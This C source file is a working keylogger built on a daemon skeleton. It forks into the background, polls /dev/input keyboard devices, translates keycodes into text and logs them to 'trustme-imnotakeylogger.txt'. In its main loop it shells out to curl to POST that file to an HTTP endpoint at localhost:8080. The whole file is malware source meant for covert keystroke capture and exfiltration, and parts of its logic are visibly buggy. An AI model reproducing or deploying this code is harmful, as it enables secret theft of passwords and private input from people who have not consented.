/*
 * daemonize.c
 * This example daemonizes a process, writes a few log messages,
 * sleeps 20 seconds and terminates afterwards.
 * This is an answer to the stackoverflow question:
 * https://stackoverflow.com/questions/17954432/creating-a-daemon-in-linux/17955149#17955149
 * Fork this code: https://github.com/pasce/daemon-skeleton-linux-c
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <syslog.h>
#include <glob.h>
#include <linux/input.h>
#include <string.h>


#define AMOUNT_CHARS 25 //How many keystrokes are needed to send the key logs
#define PATH "http://localhost:8080/api/file"



static const char *us_keymap[][2] = {
	{"\0", "\0"}, {"_ESC_", "_ESC_"}, {"1", "!"}, {"2", "@"},       // 0-3
	{"3", "#"}, {"4", "$"}, {"5", "%"}, {"6", "^"},                 // 4-7
	{"7", "&"}, {"8", "*"}, {"9", "("}, {"0", ")"},                 // 8-11
	{"-", "_"}, {"=", "+"}, {"_BACKSPACE_", "_BACKSPACE_"},         // 12-14
	{"_TAB_", "_TAB_"}, {"q", "Q"}, {"w", "W"}, {"e", "E"}, {"r", "R"},
	{"t", "T"}, {"y", "Y"}, {"u", "U"}, {"i", "I"},                 // 20-23
	{"o", "O"}, {"p", "P"}, {"[", "{"}, {"]", "}"},                 // 24-27
	{"\n", "\n"}, {"_LCTRL_", "_LCTRL_"}, {"a", "A"}, {"s", "S"},   // 28-31
	{"d", "D"}, {"f", "F"}, {"g", "G"}, {"h", "H"},                 // 32-35
	{"j", "J"}, {"k", "K"}, {"l", "L"}, {";", ":"},                 // 36-39
	{"'", "\""}, {"`", "~"}, {"_LSHIFT_", "_LSHIFT_"}, {"\\", "|"}, // 40-43
	{"z", "Z"}, {"x", "X"}, {"c", "C"}, {"v", "V"},                 // 44-47
	{"b", "B"}, {"n", "N"}, {"m", "M"}, {",", "<"},                 // 48-51
	{".", ">"}, {"/", "?"}, {"_RSHIFT_", "_RSHIFT_"}, {"_PRTSCR_", "_KPD*_"},
	{"_LALT_", "_LALT_"}, {" ", " "}, {"_CAPS_", "_CAPS_"}, {"F1", "F1"},
	{"F2", "F2"}, {"F3", "F3"}, {"F4", "F4"}, {"F5", "F5"},         // 60-63
	{"F6", "F6"}, {"F7", "F7"}, {"F8", "F8"}, {"F9", "F9"},         // 64-67
	{"F10", "F10"}, {"_NUM_", "_NUM_"}, {"_SCROLL_", "_SCROLL_"},   // 68-70
	{"_KPD7_", "_HOME_"}, {"_KPD8_", "_UP_"}, {"_KPD9_", "_PGUP_"}, // 71-73
	{"-", "-"}, {"_KPD4_", "_LEFT_"}, {"_KPD5_", "_KPD5_"},         // 74-76
	{"_KPD6_", "_RIGHT_"}, {"+", "+"}, {"_KPD1_", "_END_"},         // 77-79
	{"_KPD2_", "_DOWN_"}, {"_KPD3_", "_PGDN"}, {"_KPD0_", "_INS_"}, // 80-82
	{"_KPD._", "_DEL_"}, {"_SYSRQ_", "_SYSRQ_"}, {"\0", "\0"},      // 83-85
	{"\0", "\0"}, {"F11", "F11"}, {"F12", "F12"}, {"\0", "\0"},     // 86-89
	{"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},
	{"\0", "\0"}, {"_KPENTER_", "_KPENTER_"}, {"_RCTRL_", "_RCTRL_"}, {"/", "/"},
	{"_PRTSCR_", "_PRTSCR_"}, {"_RALT_", "_RALT_"}, {"\0", "\0"},   // 99-101
	{"_HOME_", "_HOME_"}, {"_UP_", "_UP_"}, {"_PGUP_", "_PGUP_"},   // 102-104
	{"_LEFT_", "_LEFT_"}, {"_RIGHT_", "_RIGHT_"}, {"_END_", "_END_"},
	{"_DOWN_", "_DOWN_"}, {"_PGDN", "_PGDN"}, {"_INS_", "_INS_"},   // 108-110
	{"_DEL_", "_DEL_"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},   // 111-114
	{"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"}, {"\0", "\0"},         // 115-118
	{"_PAUSE_", "_PAUSE_"},                                         // 119
};


static void skeleton_daemon()
{
    pid_t pid;

    /* Fork off the parent process */
    pid = fork();

    /* An error occurred */
    if (pid < 0)
        exit(EXIT_FAILURE);

    /* Success: Let the parent terminate */
    if (pid > 0)
        exit(EXIT_SUCCESS);

    /* On success: The child process becomes session leader */
    if (setsid() < 0)
        exit(EXIT_FAILURE);

    /* Catch, ignore and handle signals */
    //TODO: Implement a working signal handler */
    signal(SIGCHLD, SIG_IGN);
    signal(SIGHUP, SIG_IGN);

    /* Fork off for the second time*/
    pid = fork();

    /* An error occurred */
    if (pid < 0)
        exit(EXIT_FAILURE);

    /* Success: Let the parent terminate */
    if (pid > 0)
        exit(EXIT_SUCCESS);

    /* Set new file permissions */
    umask(0);

    /* Change the working directory to the root directory */
    /* or another appropriated directory */
    //chdir("/");

    /* Close all open file descriptors */
    int x;
    for (x = sysconf(_SC_OPEN_MAX); x>=0; x--)
    {
        close (x);
    }

    /* Open the log file */
    openlog ("firstdaemon", LOG_PID, LOG_DAEMON);
}

/* Return -1 if no key is being pressed, or else the lowest keycode 
   (c.f. linux/input-event-codes.h) of all the keys that are being pressed */
int keycode_of_key_being_pressed() { 
  FILE *kbd;
  glob_t kbddev;                                   // Glob structure for keyboard devices
  glob("/dev/input/by-path/*-kbd", 0, 0, &kbddev); // Glob select all keyboards
  int keycode = -1;                                // keycode of key being pressed
  for (int i = 0; i < kbddev.gl_pathc ; i++ ) {    // Loop through all the keyboard devices ...
    if (!(kbd = fopen(kbddev.gl_pathv[i], "r"))) { // ... and open them in turn (slow!)
      perror("Run as root to read keyboard devices"); 
      exit(1);      
    }

    char key_map[KEY_MAX/8 + 1];          // Create a bit array the size of the number of keys
    memset(key_map, 0, sizeof(key_map));  // Fill keymap[] with zero's
    ioctl(fileno(kbd), EVIOCGKEY(sizeof(key_map)), key_map); // Read keyboard state into keymap[]
    for (int k = 0; k < KEY_MAX/8 + 1 && keycode < 0; k++) { // scan bytes in key_map[] from left to right
      for (int j = 0; j <8 ; j++) {       // scan each byte from lsb to msb
        if (key_map[k] & (1 << j)) {      // if this bit is set: key was being pressed
          keycode = 8*k + j ;             // calculate corresponding keycode 
          break;                          // don't scan for any other keys
        }
      }   
    }

    fclose(kbd);
    if (keycode)
      break;                              // don't scan for any other keyboards
  }
  return keycode;
}

int main()
{
    skeleton_daemon();
    syslog (LOG_NOTICE, "Keylogger working correctly");
    FILE * keylog;
    unsigned int i=0;
    char stringbuffer[100]; 
    int auxkey, key, amount=0;
    key = auxkey = -999;  
    keylog = fopen("trustme-imnotakeylogger.txt","wt");
        while (1)    { //will only stop when the daemon dies
            while(auxkey == key) 
              key = keycode_of_key_being_pressed(); // key would be an int like 31 for example, that is an 's'
            auxkey = key;
            const char *us_translated_key = us_keymap[auxkey][0];
            if (key>0) 
              stringbuffer[i] = *us_translated_key;
              i++;
              amount++;
            if (amount >= 50){
              amount = 0;
              stringbuffer[i] = '\0';
              fprintf(keylog,"%s", stringbuffer);
              fflush(keylog);
              system("curl -X POST --data '@trustme-imnotakeylogger.txt' http://localhost:8080/api/file");
              i=0;
              //sends the complete file in a HTTP post request! 
              //You will find a simple HTTP server in the repository useful for tests!
            }
        }

    closelog();
    if (keylog != NULL)
      fclose(keylog);
    return EXIT_SUCCESS;
}

